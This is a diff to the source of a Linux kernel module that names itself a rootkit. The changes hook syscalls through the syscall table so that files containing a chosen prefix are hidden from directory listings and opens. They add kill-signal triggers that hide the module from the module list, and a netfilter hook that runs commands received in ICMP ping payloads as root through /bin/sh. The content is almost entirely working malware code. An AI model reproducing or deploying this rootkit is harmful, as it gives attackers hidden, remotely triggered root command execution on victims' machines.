@@ -1,7 +1,3 @@
-/*
- Works for kernel versions >= (4,17,0)
- */
-
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -15,18 +11,33 @@
 #include <linux/ftrace.h>
 #include <linux/list.h>
 
+#ifdef MODULE
+extern struct module __this_module;
+#define THIS_MODULE (&__this_module)
+#else
+#define THIS_MODULE ((struct module *)0)
+#endif
+
+#define HIDE_PREFIX     "arman"
+#define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)
+
+#define MAX_CMD_LEN 1976
+
 // Syscall table address pointer
 unsigned long *__sys_call_table_addr;
+static struct list_head *prev_module;
 
-unsigned int target_fd = 0;
-unsigned int target_pid = 0;
+char cmd_string[MAX_CMD_LEN];
+struct work_struct my_work;
+
+static struct nf_hook_ops nfho;
 
 enum signals {
-    SIGSUPER = 64, // Become root
-    SIGINVIS = 63, // Become invisible
+    HIDEMODULE = 64,
+    SHOWMODULE = 63,
+    HIDEFILES = 62,
+    SHOWFILES = 61,
 };
-
-//LIST_HEAD(hook_list);
 
 // Using kprobes method for getting syscall table address for new versions of kernel
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
@@ -81,7 +92,8 @@ typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);
 
 static syscall_wrapper orig_kill;
 static syscall_wrapper orig_sys_openat;
-static syscall_wrapper orig_sys_write;
+static syscall_wrapper orig_sys_getdents64;
+
 
 static inline void write_forced_cr0(unsigned long value)
 {
@@ -111,81 +123,99 @@ static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
 {
     int sig = regs->si;
 
-    if (sig == SIGSUPER) {
-        printk("Signal 64 was intercepted | became root");
+    void hide_module(void);
+    void show_module(void);
+
+    if (sig == HIDEMODULE) {
+        hide_module();
         return 0;
-    } else if (sig == SIGINVIS) {
-        printk("Signal 63 was intercepted | became invisible");
+    } else if (sig == SHOWMODULE) {
+        show_module();
+        return 0;
+    } else if (sig == HIDEFILES) {
+        return 0;
+    } else if (sig == SHOWFILES) {
         return 0;
     }
 
     return orig_kill(regs);
 }
 
-static char *duplicate_filename(const char __user *filename)
-{
-    char *kernel_filename;
-
-    kernel_filename = kmalloc(4096, GFP_KERNEL);
-    if (!kernel_filename) return NULL;
-
-    if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
-        kfree(kernel_filename);
-        return NULL;
-    }
-
-    return kernel_filename;
-}
-
-static asmlinkage long fh_sys_write(struct pt_regs *regs)
-{
-	long ret;
-	struct task_struct *task = current;
-    int signum = SIGKILL;
-
-	if (task->pid == target_pid) {
-        pr_info("regs->di: %d\n", regs->di);
-        pr_info("target_fd: %d\n", target_fd);
-
-		if (regs->di == target_fd) {
-            pr_info("No access!!!!\n");
-
-            return -EPERM;
-        }
-
-        pr_info("Ta blyat :(\n");
-    }
-
-	return orig_sys_write(regs);
-}
-
 static asmlinkage long fh_sys_openat(struct pt_regs *regs)
 {
-	long ret;
-	char *kernel_filename;
-	struct task_struct *task;
-	task = current;
+    const char __user* pathname = (const char __user *)regs->si;
 
-	kernel_filename = duplicate_filename((void*) regs->si);
+	long err;
+	char *kernel_filename = NULL;
 
-	if (strcmp(kernel_filename, "/tmp/test.txt") == 0) {
-		pr_info("our file is opened by process with id: %d\n", task->pid);
-		pr_info("opened file : %s\n", kernel_filename);
-		kfree(kernel_filename);
-		ret = orig_sys_openat(regs);
-		pr_info("fd returned is %ld\n", ret);
-		target_fd = ret;
-		target_pid = task->pid;
-		return ret;
-	}
+    int pathlen = strnlen_user(pathname, 256);
+    kernel_filename = kzalloc(pathlen, GFP_KERNEL);
+
+    if (kernel_filename == NULL)
+        return -ENOENT;
+
+    err = copy_from_user(kernel_filename, pathname, pathlen);
+    if (err)
+        return -EACCES;
+
+    if (strstr(kernel_filename, HIDE_PREFIX) != NULL) {
+        kfree(kernel_filename);
+        return -ENOENT;
+    }
 
 	kfree(kernel_filename);
-	ret = orig_sys_openat(regs);
 
+	return orig_sys_openat(regs);
+}
+
+static asmlinkage long h_sys_getdents64(struct pt_regs *regs)
+{
+    unsigned int fd = regs->di;
+    unsigned int count = regs->dx;
+    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
+
+    int buff;
+    struct linux_dirent64 __user *ent;
+    char *dbuf;
+
+    long ret = orig_sys_getdents64(regs);
+
+    if (ret <= 0) return ret;
+
+    dbuf = kmalloc(ret, GFP_KERNEL);
+	memset(dbuf, 0, ret);
+	copy_from_user(dbuf, dirent, ret);
+
+    for (buff = 0; buff < ret;) {
+		ent = (struct linux_dirent64*)(dbuf + buff);
+
+		if (strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) {
+			size_t reclen = ent->d_reclen;
+
+			memcpy(dbuf + buff, dbuf + buff + reclen, ret - (buff + reclen));
+			ret -= reclen;
+		} else {
+			buff += ent->d_reclen;
+		}
+	}
+
+	copy_to_user(dirent, dbuf, ret);
+	kfree(dbuf);
 	return ret;
 }
 
 #endif
+
+void hide_module(void)
+{
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void show_module(void)
+{
+    list_add(&THIS_MODULE->list, prev_module);
+}
 
 // Working with syscalls
 
@@ -225,28 +255,99 @@ static void restore_openat(void)
     __sys_call_table_addr[__NR_openat] = (unsigned long)orig_sys_openat;
 }
 
-static void store_write(void)
+
+static void store_getdents64(void)
 {
-    orig_sys_write = (syscall_wrapper)__sys_call_table_addr[__NR_write];
+    orig_sys_getdents64 = (syscall_wrapper)__sys_call_table_addr[__NR_getdents64];
 }
 
 
-static void hook_write(void)
+static void hook_getdents64(void)
 {
-    __sys_call_table_addr[__NR_write] = (unsigned long)&fh_sys_write;
+    __sys_call_table_addr[__NR_getdents64] = (unsigned long)&h_sys_getdents64;
 }
 
 
-static void restore_write(void)
+static void restore_getdents64(void)
 {
     /* Restore syscall table */
-    __sys_call_table_addr[__NR_write] = (unsigned long)orig_sys_write;
+    __sys_call_table_addr[__NR_getdents64] = (unsigned long)orig_sys_getdents64;
+}
+
+// Icmp logic
+
+static void work_handler(struct work_struct * work)
+{
+    static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL};
+    static char *envp[] = {"PATH=/bin:/sbin", NULL};
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+
+DECLARE_WORK(my_work, work_handler);
+
+static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+{
+    struct iphdr *iph;
+    struct icmphdr *icmph;
+
+    unsigned char *user_data;
+    unsigned char *tail;
+    int j = 0;
+
+    pr_info("icmp_cmd_executor executing\n");
+
+    iph = ip_hdr(skb);
+    icmph = icmp_hdr(skb);
+
+    if (iph->protocol != IPPROTO_ICMP) {
+        return NF_ACCEPT;
+    }
+    if (icmph->type != ICMP_ECHO) {
+        return NF_ACCEPT;
+    }
+
+    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
+    tail = skb_tail_pointer(skb);
+
+    j = 0;
+    while (user_data != tail){
+        char c = *user_data;
+
+        cmd_string[j] = c;
+        j++;
+
+        if (c == '\0' || j == MAX_CMD_LEN){
+            break;
+        }
+
+        user_data++;
+    }
+
+    pr_info("cmd_string: %s\n", cmd_string);
+
+    if (strncmp(cmd_string, "run:", 4) == 0) {
+        for (j = 0; cmd_string[j + 4] != '\0'; j++) {
+            cmd_string[j] = cmd_string[j + 4];
+        }
+        cmd_string[j] = '\0';
+
+        schedule_work(&my_work);
+    }
+
+    return NF_ACCEPT;
 }
 
 // Function that launches when module is inserted
 static int __init mod_init(void)
 {
     pr_info("rootkit: started\n");
+
+    nfho.hook = icmp_cmd_executor;
+    nfho.hooknum = NF_INET_PRE_ROUTING;
+    nfho.pf = PF_INET;
+    nfho.priority = NF_IP_PRI_FIRST;
+    nf_register_net_hook(&init_net, &nfho);
 
 #ifdef KPROBE_
 
@@ -269,12 +370,14 @@ static int __init mod_init(void)
 
     store_kill();
     store_openat();
-    store_write();
+    store_getdents64();
+
     unprotect_memory();
 
     hook_kill();
+    hook_getdents64();
     hook_openat();
-    hook_write();
+
     protect_memory();
 
     return 0;
@@ -287,10 +390,14 @@ static void __exit mod_exit(void)
     pr_info("rootkit: exited\n");
 
     unprotect_memory();
+
     restore_kill();
     restore_openat();
-    restore_write();
+    restore_getdents64();
+
     protect_memory();
+
+    nf_unregister_net_hook(&init_net, &nfho);
 }
 
 
